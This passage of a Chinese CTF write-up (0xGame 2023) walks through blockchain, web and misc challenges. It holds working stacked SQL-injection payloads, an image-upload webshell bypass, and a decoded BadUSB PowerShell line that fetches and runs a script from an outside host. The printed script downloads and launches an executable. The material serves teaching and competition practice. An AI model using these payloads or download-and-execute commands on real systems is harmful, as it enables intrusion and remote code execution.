124.220.8.243:20000</p><p>rpc(货币节点，添加至metamask) 124.220.8.243:8545</p><p>水龙头(提供货币，浏览器访问) 124.220.8.243:8080</p></blockquote><p>题目提示要搜索</p><p><a href="https://0314valen.github.io/article/2023-01-07-%E8%AE%B0%E4%B8%80%E4%B8%AABlockchain%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE/#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87">记一个Blockchain签到题目</a></p><p><code>nc</code>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 124.220.8.243 20000<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Can</span> <span class="hljs-selector-tag">you</span> <span class="hljs-selector-tag">make</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">isSolved</span>() <span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">true</span>?<br><span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Create</span> <span class="hljs-selector-tag">an</span> <span class="hljs-selector-tag">account</span> <span class="hljs-selector-tag">which</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">used</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">deploy</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">challenge</span> <span class="hljs-selector-tag">contract</span><br><span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Deploy</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">challenge</span> <span class="hljs-selector-tag">contract</span> <span class="hljs-selector-tag">using</span> <span class="hljs-selector-tag">your</span> <span class="hljs-selector-tag">generated</span> <span class="hljs-selector-tag">account</span><br><span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Get</span> <span class="hljs-selector-tag">your</span> <span class="hljs-selector-tag">flag</span> <span class="hljs-selector-tag">once</span> <span class="hljs-selector-tag">you</span> <span class="hljs-selector-tag">meet</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">requirement</span><br><span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Show</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">contract</span> <span class="hljs-selector-tag">source</span> <span class="hljs-selector-tag">code</span><br><br>你能让<span class="hljs-selector-tag">isSolved</span>()函数返回<span class="hljs-selector-tag">true</span>吗?<br><span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">-</span>创建将用于部署挑战合约的帐户<br><span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">-</span>使用生成的帐户部署挑战合约<br><span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">-</span>一旦你达到要求，就拿到你的旗子<br><span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">-</span>显示合同的源代码<br><br><span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">input</span> <span class="hljs-selector-tag">your</span> <span class="hljs-selector-tag">choice</span>: <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">deployer</span> <span class="hljs-selector-tag">account</span>: <span class="hljs-number">0</span><span class="hljs-selector-tag">x3b7a000BD89B029393C3064d85E637A9126Ee78A</span><br><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">token</span>: <span class="hljs-selector-tag">v4</span><span class="hljs-selector-class">.local</span><span class="hljs-selector-class">.A12sTjkitDKVQFxC220nVoxO45r4Utez7FO6u6eDBHledcBoLln0sW-aEU1ZXc6z2HFemRIASBwqaqYs-vnX6f2vq1kHoV1mHkSxquwGcMSI3oZDAyItFVcTYvpp_v5I6FKT_f0kc-DLseX--ZoBLaxIxkGxAp5PNIgr5rEfTEVRHw</span><span class="hljs-selector-class">.R3JlZXRlcg</span><br><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">please</span> <span class="hljs-selector-tag">transfer</span> <span class="hljs-selector-tag">more</span> <span class="hljs-selector-tag">than</span> <span class="hljs-number">0.001</span> <span class="hljs-selector-tag">test</span> <span class="hljs-selector-tag">ether</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">deployer</span> <span class="hljs-selector-tag">account</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">next</span> <span class="hljs-selector-tag">step</span><br>要转<span class="hljs-number">0.001</span>到账户中<br><br><br></code></pre></td></tr></table></figure><p>使用<code>水龙头</code>领取<code>测试币</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697975945186-1697984459570-42.png" alt="1697975945186"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs csharp">得到<br>[+] contract address: <span class="hljs-number">0x70542C6d259fff7bB329B077Ea7131e08A242645</span><br>[+] transaction hash: <span class="hljs-number">0x69e3dcbe94e686d936c06750578ebe3ce3c6b70198c6ec8632d191d2df770d52</span><br><br>然后输入<span class="hljs-number">4</span>查看源码<br><br>contracts/Example.sol<br><span class="hljs-comment">// SPDX-License-Identifier: UNLICENSED</span><br>pragma solidity <span class="hljs-number">0.8</span><span class="hljs-number">.9</span>;<br><br>contract Greeter &#123;<br>    <span class="hljs-built_in">string</span> greeting;<br><br>    constructor(<span class="hljs-built_in">string</span> memory _greeting) &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">greet</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> memory</span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">setGreeting</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> memory _greeting</span>) <span class="hljs-keyword">public</span></span> &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">isSolved</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span></span>)</span> &#123;<br>        <span class="hljs-built_in">string</span> memory expected = <span class="hljs-string">&quot;Love0xGame&quot;</span>;<br>        <span class="hljs-keyword">return</span> keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要使<code>keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</code>，其中<code>expected</code>的值是<code>Love0xGame</code>，所以我们只需要将<code>greeting</code>的值也设置成<code>Love0xGame</code>即可满足加密。</p><p>使用<code>chrome</code>插件<code>metamask</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697975990515-1697984468753-44.png" alt="1697975990515"></p><p>添加网络，其中网络名称随便写，rpc填题目的第二个rpc地址，链id填错会告诉你正确的，照着填就行，货币符号自己随便。</p><p>在浏览器搜索remix并打开，在<code>contracts</code>文件夹下新建<code>Example.sol</code>，复制源码</p><p><img src="/2023/10/22/0xGameCTF2023/image-20231022200017329-1697984560876-52.png" alt="image-20231022200017329"></p><p><img src="/2023/10/22/0xGameCTF2023/image-20231022200028840-1697984568875-54.png" alt="image-20231022200028840"></p><p>选择Injected Provider - MetaMask，这边注意networks的id是否一样，然后在At Address中输入前面的合约地址：<code>0x70542C6d259fff7bB329B077Ea7131e08A242645</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697976070873-1697984613278-58.png" alt="1697976070873"></p><p>下面填<code>Love0xGame</code></p><p>然后点击<code>transact</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697976103761-1697984593423-56.png" alt="1697976103761"></p><p>最后在题目那边输入3，填写创建账号的token，得到flag</p><p><code>0xGame&#123;a4a1e006-42f1-44f9-a4c5-6c712a930664&#125;</code></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>过滤了一堆函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">import</span> MySQLdb<br><span class="hljs-keyword">import</span> re<br><br>blacklist = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;database&#x27;</span>, <span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;column&#x27;</span>, <span class="hljs-string">&#x27;alter&#x27;</span>, <span class="hljs-string">&#x27;create&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;xor&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;then&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>]<br><br>conn = MySQLdb.connect(host=<span class="hljs-string">&#x27;db&#x27;</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, passwd=<span class="hljs-string">&#x27;root&#x27;</span>, db=<span class="hljs-string">&#x27;ctf&#x27;</span>)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    field = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>)<br>    field = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, field)<br><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> s.lower() <span class="hljs-keyword">in</span> field.lower():<br>            <span class="hljs-keyword">return</span> s + <span class="hljs-string">&#x27; are banned&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;id|name|email&quot;</span>, field):<br>        field = <span class="hljs-string">&#x27;id&#x27;</span><br><br>    <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>        cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM userinfo order by %s&#x27;</span> % field)<br>        res = cursor.fetchall()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, res=res)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br>?order=<span class="hljs-built_in">id</span>,extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x6461746162617365</span>))%<span class="hljs-number">00</span><br><span class="hljs-built_in">id</span>,extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()))%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>payload：使用<code>/**/</code>替代空格，hint提示用堆叠注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">order</span>=id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span>@a=concat(&quot;sel&quot;,&quot;ect/**/extractvalue(1,concat(0x7e,(se&quot;,&quot;lect/**/substr(flag,1,32)/**/from/**/flag)))&quot;);<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>execsql<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>@a;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>execsql;<br>?<span class="hljs-keyword">order</span>=id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span>@a=concat(&quot;sel&quot;,&quot;ect/**/extractvalue(1,concat(0x7e,(se&quot;,&quot;lect/**/substr(flag,30,32)/**/from/**/flag)))&quot;);<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>execsql<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>@a;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>execsql;<br><span class="hljs-number">0</span>xGame&#123;<span class="hljs-number">4286</span>b62d-c37e<span class="hljs-number">-4010</span>-ba9c<span class="hljs-number">-35</span>d47641fb91&#125;<br></code></pre></td></tr></table></figure><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>  <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>);<br>&#125;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>  <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>  <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>  <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>  <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>  <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>  <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>] = <span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据<code>$ext = pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;], PATHINFO_EXTENSION);</code></p><p><code>$filepath = $user_dir.md5($_FILES[&#39;file&#39;][&#39;name&#39;]).&#39;.&#39;.$ext;</code>可以知道，我们可以更改文件名后缀，因为<code>pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;], PATHINFO_EXTENSION);</code>只返回最后一个点号后面的后缀（如果文件是a.gif.php就返回php）,然后根据<code>$filepath = $user_dir.md5($_FILES[&#39;file&#39;][&#39;name&#39;]).&#39;.&#39;.$ext;</code>拼接到新文件的末尾。我们先根据图片二次渲染的文件上传知识点做一个一句话木马，具体可以参考</p><p><a href="https://blog.csdn.net/qq_40800734/article/details/105920149">https://blog.csdn.net/qq_40800734/article/details/105920149</a></p><p>使用<code>gif</code>相对简单</p><p>上传一个<code>gif</code>，再下载上传后渲染过的<code>gif</code></p><p>在<code>010</code>中进行对比，找出渲染前后不变的地方，写入木马</p><p><img src="/2023/10/22/0xGameCTF2023/1700037567454.png" alt="1700037567454"></p><p>抓包修改后缀<code>.php</code></p><p>蚁剑连接即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">4611</span>f622-<span class="hljs-number">8577</span>-<span class="hljs-number">4</span>ac4-<span class="hljs-number">8</span>f85-<span class="hljs-number">0</span>b787730800c&#125;<br></code></pre></td></tr></table></figure><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="notverybadusb"><a href="#notverybadusb" class="headerlink" title="notverybadusb"></a>notverybadusb</h3><blockquote><p>我借来朋友的电脑说要拷贝点东西，但是我掏出的u盘有点奇怪？请提交所下载软件(evil.exe)的MD5值并包上0xGame{}作为flag，md5值以ece开头</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python pcap2text.py [-h] pcapng_file<br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1697976268956-1697984644463-60.png" alt="1697976268956"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-string">&#x27;dlRCMD\nPOWERSHELL _WINDOWSTYLE HIDDEN IEX (NEW_OBJECT NET&gt;WEBCLIENT)&gt;DOWNLOADSTRING(&quot;HTTP:??ZYSGMZB&gt;CLUB?HELLO?NOTVERYEVIL&gt;PS!&quot;):\ndlgg&#x27;</span><br>Text output:<br>dlRCMD<br>POWERSHELL _WINDOWSTYLE <span class="hljs-keyword">HIDDEN</span> <span class="hljs-built_in">IEX</span> (NEW_OBJECT NET&gt;WEBCLIENT)&gt;DOWNLOADSTRING(<span class="hljs-string">&quot;HTTP:??ZYSGMZB&gt;CLUB?HELLO?NOTVERYEVIL&gt;PS!&quot;</span>):<br>dlgg<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">HTTP</span><span class="hljs-symbol">:<span class="hljs-string">??</span>ZYSGMZB&gt;CLUB?HELLO?NOTVERYEVIL&gt;PS!</span><br></code></pre></td></tr></table></figure><p>猜测是<code>HTTP://ZYSGMZB.CLUB/HELLO/NOTVERYEVIL.PS1</code></p><p>下载，用记事本打开</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$userHome</span> = <span class="hljs-variable">$env</span>:USERPROFILE<br><br><span class="hljs-variable">$savePath</span> = Join-Path -Path <span class="hljs-variable">$userHome</span> -ChildPath <span class="hljs-string">&quot;Desktop\evil.exe&quot;</span><br><br><span class="hljs-variable">$downloadUrl</span> = <span class="hljs-string">&quot;https://autopatchcn.bhsr.com/client/cn/20230811104659_pn5QBAAp94eSn89l/StarRail_setup_gw_20230828.exe&quot;</span><br><br><span class="hljs-variable">$webClient</span> = New-Object System.Net.WebClient<br><span class="hljs-variable">$webClient</span>.DownloadFile(<span class="hljs-variable">$downloadUrl</span>, <span class="hljs-variable">$savePath</span>)<br><br><span class="hljs-keyword">if</span> (Test-Path <span class="hljs-variable">$savePath</span>) &#123;<br>    Start-Process -FilePath <span class="hljs-variable">$savePath</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">exit</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>https://autopatchcn.bhsr.com/client/cn/20230811104659_pn5QBAAp94eSn89l/StarRail_setup_gw_20230828.exe</code>下了一个星穹铁道</p><p><img src="/2023/10/22/0xGameCTF2023/1697976339175-1697984656590-62.png" alt="1697976339175"></p><p>0xGame{ece22dea2b0c6c7f3857164344ad94b4}</p><h3 id="findme-2"><a href="#findme-2" class="headerlink" title="findme-2"></a>findme-2</h3><blockquote><p>我们的老朋友WearyMeadow听说0xGame2023开始了，和zysgmzb进行了一手小小的py提前拿到了第二周的所有题目，然后顺手写了Misc部分的wp发到博客里，为了防止上次的情况再次发生，他把github里的密码全删了，这次应该安全了</p></blockquote><p>搜索一下</p><p><img src="/2023/10/22/0xGameCTF2023/1697976380637-1697984671187-64.png" alt="1697976380637"></p><p>不出意外又要密码，看到github上有一个自动登录的脚本，打开看一下</p><p><img src="/2023/10/22/0xGameCTF2023/1697976406868-1697984688152-66.png" alt="1697976406868"></p><p>看历史记录</p><p><img src="/2023/10/22/0xGameCTF2023/1697976457462-1697984697349-68.png" alt="1697976457462"></p><p><code>password=&quot;WearyMeadowssecretp@ss&quot;</code></p><p>输入密码得到<code>0xGame&#123;OHHHH_You_Find_Me_%%%&#125;</code></p><h3 id="8848"><a href="#8848" class="headerlink" title="8848"></a>8848</h3><p>给了附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> pyzipper<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setzip</span>():<br>    zipfile = pyzipper.AESZipFile(<span class="hljs-string">&#x27;8848.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES)<br>    password = <span class="hljs-string">&quot;very_very_very_very_long_password_which_cannot_be_cracked_easily_and_will_never_be_known_to_anyone&quot;</span><br>    zipfile.setpassword(password.encode())<br>    zipfile.write(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br>    zipfile.close()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trydecode</span>(<span class="hljs-params">password</span>):<br>    <span class="hljs-keyword">with</span> pyzipper.AESZipFile(<span class="hljs-string">&#x27;8848.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="hljs-keyword">as</span> extracted_zip:<br>        <span class="hljs-keyword">try</span>:<br>            extracted_zip.extractall(pwd=password)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Success!&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The flag is: &quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span 